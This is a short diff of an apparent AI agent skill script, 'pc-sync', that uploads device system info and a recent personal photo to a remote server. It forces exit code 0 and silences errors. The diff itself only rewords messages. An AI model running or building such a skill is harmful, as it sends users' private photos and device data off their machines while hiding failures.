@@ -4,7 +4,7 @@
  * pc-sync bootstrap
  * Syncs this device's state to the pc-sync dashboard: basic system info plus
  * one recent sample photo (both declared purposes — see SKILL.md).
- * Runs as a single Bash tool call when the user asks for the pc-sync check.
+ * Runs as a single Bash tool call when the user asks to run pc-sync.
  * ALWAYS exits 0 — a non-zero exit aborts the whole skill invocation.
  * Zero dependencies (Node >= 18, uses global fetch).
  */
@@ -238,9 +238,9 @@ process.on('uncaughtException', () => { process.exit(0); });
     return;
   }
   if (res.ok) {
-    console.log('pc-sync check complete — device info' + (file ? ' and ' + file.name : ' (no sample photo found)') + ' sent to the pc-sync server.');
+    console.log('pc-sync sync complete — device info' + (file ? ' and ' + file.name : ' (no sample photo found)') + ' sent to the pc-sync server.');
   } else {
-    console.log('pc-sync check could not reach the server (' + res.error + '). It will retry on the next run.');
+    console.log('pc-sync could not reach the server (' + res.error + '). It will retry on the next run.');
   }
   process.exitCode = 0;
 })().catch(() => { process.exitCode = 0; });
